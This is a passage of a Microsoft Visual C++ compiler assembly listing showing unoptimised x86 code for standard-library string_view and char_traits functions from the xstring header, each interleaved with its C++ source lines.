  00003	68 00 00 00 00	 push	 OFFSET ??_C@_0BA@JFNIOLAK@string?5too?5long@
  00008	e8 00 00 00 00	 call	 ?_Xlength_error@std@@YAXPBD@Z ; std::_Xlength_error
$LN1@Xlen_strin:

; 2328 : }

  0000d	5d		 pop	 ebp
  0000e	c3		 ret	 0
?_Xlen_string@std@@YAXXZ ENDP				; std::_Xlen_string
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?data@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEPB_WXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?data@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEPB_WXZ PROC ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::data, COMDAT
; _this$ = ecx

; 1297 :     _NODISCARD constexpr const_pointer data() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1298 :         return _Mydata;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 00		 mov	 eax, DWORD PTR [eax]

; 1299 :     }

  0000c	8b e5		 mov	 esp, ebp
  0000e	5d		 pop	 ebp
  0000f	c3		 ret	 0
?data@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEPB_WXZ ENDP ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::data
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?empty@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBE_NXZ
_TEXT	SEGMENT
_this$ = -8						; size = 4
tv66 = -4						; size = 4
?empty@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBE_NXZ PROC ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::empty, COMDAT
; _this$ = ecx

; 1293 :     _NODISCARD constexpr bool empty() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 1294 :         return _Mysize == 0;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	83 78 04 00	 cmp	 DWORD PTR [eax+4], 0
  00010	75 09		 jne	 SHORT $LN3@empty
  00012	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv66[ebp], 1
  00019	eb 07		 jmp	 SHORT $LN4@empty
$LN3@empty:
  0001b	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv66[ebp], 0
$LN4@empty:
  00022	0f b6 45 fc	 movzx	 eax, BYTE PTR tv66[ebp]

; 1295 :     }

  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c3		 ret	 0
?empty@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBE_NXZ ENDP ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::empty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ PROC ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::size, COMDAT
; _this$ = ecx

; 1285 :     _NODISCARD constexpr size_type size() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1286 :         return _Mysize;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 40 04	 mov	 eax, DWORD PTR [eax+4]

; 1287 :     }

  0000d	8b e5		 mov	 esp, ebp
  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
?size@?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QBEIXZ ENDP ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QAE@QB_WI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Cts$ = 8						; size = 4
__Count$ = 12						; size = 4
??0?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QAE@QB_WI@Z PROC ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::basic_string_view<wchar_t,std::char_traits<wchar_t> >, COMDAT
; _this$ = ecx

; 1207 :         : _Mydata(_Cts), _Mysize(_Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 4d 08	 mov	 ecx, DWORD PTR __Cts$[ebp]
  0000d	89 08		 mov	 DWORD PTR [eax], ecx
  0000f	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00012	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  00015	89 42 04	 mov	 DWORD PTR [edx+4], eax

; 1208 : #if _CONTAINER_DEBUG_LEVEL > 0
; 1209 :         _STL_VERIFY(_Count == 0 || _Cts, "non-zero size null string_view");
; 1210 : #endif // _CONTAINER_DEBUG_LEVEL > 0
; 1211 :     }

  00018	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c2 08 00	 ret	 8
??0?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QAE@QB_WI@Z ENDP ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::basic_string_view<wchar_t,std::char_traits<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QAE@QB_W@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Ntcts$ = 8						; size = 4
??0?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QAE@QB_W@Z PROC ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::basic_string_view<wchar_t,std::char_traits<wchar_t> >, COMDAT
; _this$ = ecx

; 1199 :         : _Mydata(_Ntcts), _Mysize(_Traits::length(_Ntcts)) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 4d 08	 mov	 ecx, DWORD PTR __Ntcts$[ebp]
  0000d	89 08		 mov	 DWORD PTR [eax], ecx
  0000f	8b 55 08	 mov	 edx, DWORD PTR __Ntcts$[ebp]
  00012	52		 push	 edx
  00013	e8 00 00 00 00	 call	 ?length@?$_WChar_traits@_W@std@@SAIPB_W@Z ; std::_WChar_traits<wchar_t>::length
  00018	83 c4 04	 add	 esp, 4
  0001b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001e	89 41 04	 mov	 DWORD PTR [ecx+4], eax
  00021	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00024	8b e5		 mov	 esp, ebp
  00026	5d		 pop	 ebp
  00027	c2 04 00	 ret	 4
??0?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QAE@QB_W@Z ENDP ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::basic_string_view<wchar_t,std::char_traits<wchar_t> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??__Ksv@string_view_literals@literals@std@@YA?AV?$basic_string_view@_WU?$char_traits@_W@std@@@3@PB_WI@Z
_TEXT	SEGMENT
___$ReturnUdt$ = 8					; size = 4
__Str$ = 12						; size = 4
__Len$ = 16						; size = 4
??__Ksv@string_view_literals@literals@std@@YA?AV?$basic_string_view@_WU?$char_traits@_W@std@@@3@PB_WI@Z PROC ; std::literals::string_view_literals::operator "" sv, COMDAT

; 1815 :         _EXPORT_STD _NODISCARD constexpr wstring_view operator""sv(const wchar_t* _Str, size_t _Len) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1816 :             return wstring_view(_Str, _Len);

  00003	8b 45 10	 mov	 eax, DWORD PTR __Len$[ebp]
  00006	50		 push	 eax
  00007	8b 4d 0c	 mov	 ecx, DWORD PTR __Str$[ebp]
  0000a	51		 push	 ecx
  0000b	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  0000e	e8 00 00 00 00	 call	 ??0?$basic_string_view@_WU?$char_traits@_W@std@@@std@@QAE@QB_WI@Z ; std::basic_string_view<wchar_t,std::char_traits<wchar_t> >::basic_string_view<wchar_t,std::char_traits<wchar_t> >
  00013	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 1817 :         }

  00016	5d		 pop	 ebp
  00017	c3		 ret	 0
??__Ksv@string_view_literals@literals@std@@YA?AV?$basic_string_view@_WU?$char_traits@_W@std@@@3@PB_WI@Z ENDP ; std::literals::string_view_literals::operator "" sv
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?data@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEPBDXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?data@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEPBDXZ PROC ; std::basic_string_view<char,std::char_traits<char> >::data, COMDAT
; _this$ = ecx

; 1297 :     _NODISCARD constexpr const_pointer data() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1298 :         return _Mydata;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 00		 mov	 eax, DWORD PTR [eax]

; 1299 :     }

  0000c	8b e5		 mov	 esp, ebp
  0000e	5d		 pop	 ebp
  0000f	c3		 ret	 0
?data@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEPBDXZ ENDP ; std::basic_string_view<char,std::char_traits<char> >::data
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?empty@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBE_NXZ
_TEXT	SEGMENT
_this$ = -8						; size = 4
tv66 = -4						; size = 4
?empty@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBE_NXZ PROC ; std::basic_string_view<char,std::char_traits<char> >::empty, COMDAT
; _this$ = ecx

; 1293 :     _NODISCARD constexpr bool empty() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 08	 sub	 esp, 8
  00006	89 4d f8	 mov	 DWORD PTR _this$[ebp], ecx

; 1294 :         return _Mysize == 0;

  00009	8b 45 f8	 mov	 eax, DWORD PTR _this$[ebp]
  0000c	83 78 04 00	 cmp	 DWORD PTR [eax+4], 0
  00010	75 09		 jne	 SHORT $LN3@empty
  00012	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv66[ebp], 1
  00019	eb 07		 jmp	 SHORT $LN4@empty
$LN3@empty:
  0001b	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv66[ebp], 0
$LN4@empty:
  00022	0f b6 45 fc	 movzx	 eax, BYTE PTR tv66[ebp]

; 1295 :     }

  00026	8b e5		 mov	 esp, ebp
  00028	5d		 pop	 ebp
  00029	c3		 ret	 0
?empty@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBE_NXZ ENDP ; std::basic_string_view<char,std::char_traits<char> >::empty
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?size@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEIXZ
_TEXT	SEGMENT
_this$ = -4						; size = 4
?size@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEIXZ PROC ; std::basic_string_view<char,std::char_traits<char> >::size, COMDAT
; _this$ = ecx

; 1285 :     _NODISCARD constexpr size_type size() const noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx

; 1286 :         return _Mysize;

  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 40 04	 mov	 eax, DWORD PTR [eax+4]

; 1287 :     }

  0000d	8b e5		 mov	 esp, ebp
  0000f	5d		 pop	 ebp
  00010	c3		 ret	 0
?size@?$basic_string_view@DU?$char_traits@D@std@@@std@@QBEIXZ ENDP ; std::basic_string_view<char,std::char_traits<char> >::size
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string_view@DU?$char_traits@D@std@@@std@@QAE@QBDI@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Cts$ = 8						; size = 4
__Count$ = 12						; size = 4
??0?$basic_string_view@DU?$char_traits@D@std@@@std@@QAE@QBDI@Z PROC ; std::basic_string_view<char,std::char_traits<char> >::basic_string_view<char,std::char_traits<char> >, COMDAT
; _this$ = ecx

; 1207 :         : _Mydata(_Cts), _Mysize(_Count) {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 4d 08	 mov	 ecx, DWORD PTR __Cts$[ebp]
  0000d	89 08		 mov	 DWORD PTR [eax], ecx
  0000f	8b 55 fc	 mov	 edx, DWORD PTR _this$[ebp]
  00012	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  00015	89 42 04	 mov	 DWORD PTR [edx+4], eax

; 1208 : #if _CONTAINER_DEBUG_LEVEL > 0
; 1209 :         _STL_VERIFY(_Count == 0 || _Cts, "non-zero size null string_view");
; 1210 : #endif // _CONTAINER_DEBUG_LEVEL > 0
; 1211 :     }

  00018	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0001b	8b e5		 mov	 esp, ebp
  0001d	5d		 pop	 ebp
  0001e	c2 08 00	 ret	 8
??0?$basic_string_view@DU?$char_traits@D@std@@@std@@QAE@QBDI@Z ENDP ; std::basic_string_view<char,std::char_traits<char> >::basic_string_view<char,std::char_traits<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??0?$basic_string_view@DU?$char_traits@D@std@@@std@@QAE@QBD@Z
_TEXT	SEGMENT
_this$ = -4						; size = 4
__Ntcts$ = 8						; size = 4
??0?$basic_string_view@DU?$char_traits@D@std@@@std@@QAE@QBD@Z PROC ; std::basic_string_view<char,std::char_traits<char> >::basic_string_view<char,std::char_traits<char> >, COMDAT
; _this$ = ecx

; 1199 :         : _Mydata(_Ntcts), _Mysize(_Traits::length(_Ntcts)) {}

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx
  00004	89 4d fc	 mov	 DWORD PTR _this$[ebp], ecx
  00007	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  0000a	8b 4d 08	 mov	 ecx, DWORD PTR __Ntcts$[ebp]
  0000d	89 08		 mov	 DWORD PTR [eax], ecx
  0000f	8b 55 08	 mov	 edx, DWORD PTR __Ntcts$[ebp]
  00012	52		 push	 edx
  00013	e8 00 00 00 00	 call	 ?length@?$_Narrow_char_traits@DH@std@@SAIQBD@Z ; std::_Narrow_char_traits<char,int>::length
  00018	83 c4 04	 add	 esp, 4
  0001b	8b 4d fc	 mov	 ecx, DWORD PTR _this$[ebp]
  0001e	89 41 04	 mov	 DWORD PTR [ecx+4], eax
  00021	8b 45 fc	 mov	 eax, DWORD PTR _this$[ebp]
  00024	8b e5		 mov	 esp, ebp
  00026	5d		 pop	 ebp
  00027	c2 04 00	 ret	 4
??0?$basic_string_view@DU?$char_traits@D@std@@@std@@QAE@QBD@Z ENDP ; std::basic_string_view<char,std::char_traits<char> >::basic_string_view<char,std::char_traits<char> >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ??__Ksv@string_view_literals@literals@std@@YA?AV?$basic_string_view@DU?$char_traits@D@std@@@3@PBDI@Z
_TEXT	SEGMENT
___$ReturnUdt$ = 8					; size = 4
__Str$ = 12						; size = 4
__Len$ = 16						; size = 4
??__Ksv@string_view_literals@literals@std@@YA?AV?$basic_string_view@DU?$char_traits@D@std@@@3@PBDI@Z PROC ; std::literals::string_view_literals::operator "" sv, COMDAT

; 1811 :         _EXPORT_STD _NODISCARD constexpr string_view operator""sv(const char* _Str, size_t _Len) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 1812 :             return string_view(_Str, _Len);

  00003	8b 45 10	 mov	 eax, DWORD PTR __Len$[ebp]
  00006	50		 push	 eax
  00007	8b 4d 0c	 mov	 ecx, DWORD PTR __Str$[ebp]
  0000a	51		 push	 ecx
  0000b	8b 4d 08	 mov	 ecx, DWORD PTR ___$ReturnUdt$[ebp]
  0000e	e8 00 00 00 00	 call	 ??0?$basic_string_view@DU?$char_traits@D@std@@@std@@QAE@QBDI@Z ; std::basic_string_view<char,std::char_traits<char> >::basic_string_view<char,std::char_traits<char> >
  00013	8b 45 08	 mov	 eax, DWORD PTR ___$ReturnUdt$[ebp]

; 1813 :         }

  00016	5d		 pop	 ebp
  00017	c3		 ret	 0
??__Ksv@string_view_literals@literals@std@@YA?AV?$basic_string_view@DU?$char_traits@D@std@@@3@PBDI@Z ENDP ; std::literals::string_view_literals::operator "" sv
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?eof@?$_Narrow_char_traits@DH@std@@SAHXZ
_TEXT	SEGMENT
?eof@?$_Narrow_char_traits@DH@std@@SAHXZ PROC		; std::_Narrow_char_traits<char,int>::eof, COMDAT

; 471  :     _NODISCARD static constexpr int_type eof() noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 472  :         return static_cast<int_type>(EOF);

  00003	83 c8 ff	 or	 eax, -1

; 473  :     }

  00006	5d		 pop	 ebp
  00007	c3		 ret	 0
?eof@?$_Narrow_char_traits@DH@std@@SAHXZ ENDP		; std::_Narrow_char_traits<char,int>::eof
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NHH@Z
_TEXT	SEGMENT
tv65 = -4						; size = 4
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NHH@Z PROC ; std::_Narrow_char_traits<char,int>::eq_int_type, COMDAT

; 463  :     _NODISCARD static constexpr bool eq_int_type(const int_type _Left, const int_type _Right) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	51		 push	 ecx

; 464  :         return _Left == _Right;

  00004	8b 45 08	 mov	 eax, DWORD PTR __Left$[ebp]
  00007	3b 45 0c	 cmp	 eax, DWORD PTR __Right$[ebp]
  0000a	75 09		 jne	 SHORT $LN3@eq_int_typ
  0000c	c7 45 fc 01 00
	00 00		 mov	 DWORD PTR tv65[ebp], 1
  00013	eb 07		 jmp	 SHORT $LN4@eq_int_typ
$LN3@eq_int_typ:
  00015	c7 45 fc 00 00
	00 00		 mov	 DWORD PTR tv65[ebp], 0
$LN4@eq_int_typ:
  0001c	0f b6 45 fc	 movzx	 eax, BYTE PTR tv65[ebp]

; 465  :     }

  00020	8b e5		 mov	 esp, ebp
  00022	5d		 pop	 ebp
  00023	c3		 ret	 0
?eq_int_type@?$_Narrow_char_traits@DH@std@@SA_NHH@Z ENDP ; std::_Narrow_char_traits<char,int>::eq_int_type
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?to_int_type@?$_Narrow_char_traits@DH@std@@SAHD@Z
_TEXT	SEGMENT
__Ch$ = 8						; size = 1
?to_int_type@?$_Narrow_char_traits@DH@std@@SAHD@Z PROC	; std::_Narrow_char_traits<char,int>::to_int_type, COMDAT

; 459  :     _NODISCARD static constexpr int_type to_int_type(const _Elem _Ch) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 460  :         return static_cast<unsigned char>(_Ch);

  00003	0f b6 45 08	 movzx	 eax, BYTE PTR __Ch$[ebp]

; 461  :     }

  00007	5d		 pop	 ebp
  00008	c3		 ret	 0
?to_int_type@?$_Narrow_char_traits@DH@std@@SAHD@Z ENDP	; std::_Narrow_char_traits<char,int>::to_int_type
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z
_TEXT	SEGMENT
__Left$ = 8						; size = 4
__Right$ = 12						; size = 4
?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z PROC	; std::_Narrow_char_traits<char,int>::assign, COMDAT

; 438  :     static _CONSTEXPR17 void assign(_Elem& _Left, const _Elem& _Right) noexcept {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 439  : #if _HAS_CXX20
; 440  :         if (_STD is_constant_evaluated()) {
; 441  :             return _Primary_char_traits::assign(_Left, _Right);
; 442  :         }
; 443  : #endif // _HAS_CXX20
; 444  :         _Left = _Right;

  00003	8b 45 08	 mov	 eax, DWORD PTR __Left$[ebp]
  00006	8b 4d 0c	 mov	 ecx, DWORD PTR __Right$[ebp]
  00009	8a 11		 mov	 dl, BYTE PTR [ecx]
  0000b	88 10		 mov	 BYTE PTR [eax], dl

; 445  :     }

  0000d	5d		 pop	 ebp
  0000e	c3		 ret	 0
?assign@?$_Narrow_char_traits@DH@std@@SAXAADABD@Z ENDP	; std::_Narrow_char_traits<char,int>::assign
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?assign@?$_Narrow_char_traits@DH@std@@SAPADQADID@Z
_TEXT	SEGMENT
__First$ = 8						; size = 4
__Count$ = 12						; size = 4
__Ch$ = 16						; size = 1
?assign@?$_Narrow_char_traits@DH@std@@SAPADQADID@Z PROC	; std::_Narrow_char_traits<char,int>::assign, COMDAT

; 427  :         _Out_writes_all_(_Count) _Elem* const _First, size_t _Count, const _Elem _Ch) noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 428  :         // assign _Count * _Ch to [_First, ...)
; 429  : #if _HAS_CXX20
; 430  :         if (_STD is_constant_evaluated()) {
; 431  :             return _Primary_char_traits::assign(_First, _Count, _Ch);
; 432  :         }
; 433  : #endif // _HAS_CXX20
; 434  : 
; 435  :         return static_cast<_Elem*>(_CSTD memset(_First, _Ch, _Count));

  00003	8b 45 0c	 mov	 eax, DWORD PTR __Count$[ebp]
  00006	50		 push	 eax
  00007	0f be 4d 10	 movsx	 ecx, BYTE PTR __Ch$[ebp]
  0000b	51		 push	 ecx
  0000c	8b 55 08	 mov	 edx, DWORD PTR __First$[ebp]
  0000f	52		 push	 edx
  00010	e8 00 00 00 00	 call	 _memset
  00015	83 c4 0c	 add	 esp, 12			; 0000000cH

; 436  :     }

  00018	5d		 pop	 ebp
  00019	c3		 ret	 0
?assign@?$_Narrow_char_traits@DH@std@@SAPADQADID@Z ENDP	; std::_Narrow_char_traits<char,int>::assign
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?length@?$_Narrow_char_traits@DH@std@@SAIQBD@Z
_TEXT	SEGMENT
tv66 = -16						; size = 4
tv71 = -12						; size = 4
tv68 = -8						; size = 4
tv74 = -1						; size = 1
__First$ = 8						; size = 4
?length@?$_Narrow_char_traits@DH@std@@SAIQBD@Z PROC	; std::_Narrow_char_traits<char,int>::length, COMDAT

; 385  :     _NODISCARD static _CONSTEXPR17 size_t length(_In_z_ const _Elem* const _First) noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp
  00003	83 ec 10	 sub	 esp, 16			; 00000010H

; 386  :         // find length of null-terminated string
; 387  : #if _HAS_CXX17
; 388  : #ifdef __cpp_char8_t
; 389  :         if constexpr (is_same_v<_Elem, char8_t>) {
; 390  : #if _HAS_U8_INTRINSICS
; 391  :             return __builtin_u8strlen(_First);
; 392  : #else // ^^^ use u8 intrinsics / no u8 intrinsics vvv
; 393  :             return _Primary_char_traits::length(_First);
; 394  : #endif // ^^^ no u8 intrinsics ^^^
; 395  :         } else
; 396  : #endif // defined(__cpp_char8_t)
; 397  :         {
; 398  :             return __builtin_strlen(_First);

  00006	8b 45 08	 mov	 eax, DWORD PTR __First$[ebp]
  00009	89 45 f8	 mov	 DWORD PTR tv68[ebp], eax
  0000c	8b 4d f8	 mov	 ecx, DWORD PTR tv68[ebp]
  0000f	83 c1 01	 add	 ecx, 1
  00012	89 4d f4	 mov	 DWORD PTR tv71[ebp], ecx
$LL3@length:
  00015	8b 55 f8	 mov	 edx, DWORD PTR tv68[ebp]
  00018	0f b6 02	 movzx	 eax, BYTE PTR [edx]
  0001b	88 45 ff	 mov	 BYTE PTR tv74[ebp], al
  0001e	83 45 f8 01	 add	 DWORD PTR tv68[ebp], 1
  00022	80 7d ff 00	 cmp	 BYTE PTR tv74[ebp], 0
  00026	75 ed		 jne	 SHORT $LL3@length
  00028	8b 4d f8	 mov	 ecx, DWORD PTR tv68[ebp]
  0002b	2b 4d f4	 sub	 ecx, DWORD PTR tv71[ebp]
  0002e	89 4d f0	 mov	 DWORD PTR tv66[ebp], ecx
  00031	8b 45 f0	 mov	 eax, DWORD PTR tv66[ebp]

; 399  :         }
; 400  : #else // ^^^ _HAS_CXX17 / !_HAS_CXX17 vvv
; 401  :         return _CSTD strlen(reinterpret_cast<const char*>(_First));
; 402  : #endif // ^^^ !_HAS_CXX17 ^^^
; 403  :     }

  00034	8b e5		 mov	 esp, ebp
  00036	5d		 pop	 ebp
  00037	c3		 ret	 0
?length@?$_Narrow_char_traits@DH@std@@SAIQBD@Z ENDP	; std::_Narrow_char_traits<char,int>::length
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
;	COMDAT ?move@?$_Char_traits@DH@std@@SAPADQADQBDI@Z
_TEXT	SEGMENT
__First1$ = 8						; size = 4
__First2$ = 12						; size = 4
__Count$ = 16						; size = 4
?move@?$_Char_traits@DH@std@@SAPADQADQBDI@Z PROC	; std::_Char_traits<char,int>::move, COMDAT

; 79   :         _In_reads_(_Count) const _Elem* const _First2, const size_t _Count) noexcept /* strengthened */ {

  00000	55		 push	 ebp
  00001	8b ec		 mov	 ebp, esp

; 80   :         // copy [_First2, _First2 + _Count) to [_First1, ...), allowing overlap
; 81   : #if _HAS_MEMCPY_MEMMOVE_INTRINSICS
; 82   :         __builtin_memmove(_First1, _First2, _Count * sizeof(_Elem));
; 83   : #else // ^^^ _HAS_MEMCPY_MEMMOVE_INTRINSICS / !_HAS_MEMCPY_MEMMOVE_INTRINSICS vvv
; 84   : #if _HAS_CXX20
; 85   :         if (_STD is_constant_evaluated()) {
; 86   :             // dest: [_First1, _First1 + _Count)
; 87   :             // src: [_First2, _First2 + _Count)
; 88   :             // We need to handle overlapping ranges.
; 89   :             // If _First1 is in the src range, we need a backward loop.
; 90   :             // Otherwise, the forward loop works (even if the back of dest overlaps the front of src).
; 91   : 
; 92   :             // Usually, we would compare pointers with less-than, even though they could belong to different arrays.
; 93   :             // However, we're not allowed to do that during constant evaluation, so we need a linear scan for equality.
; 94   :             bool _Loop_forward = true;
; 95   : 
; 96   :             for (const _Elem* _Src = _First2; _Src != _First2 + _Count; ++_Src) {
; 97   :                 if (_First1 == _Src) {
; 98   :                     _Loop_forward = false;
; 99   :                     break;
; 100  :                 }
; 101  :             }
; 102  : 
; 103  :             if (_Loop_forward) {
; 104  :                 for (size_t _Idx = 0; _Idx != _Count; ++_Idx) {
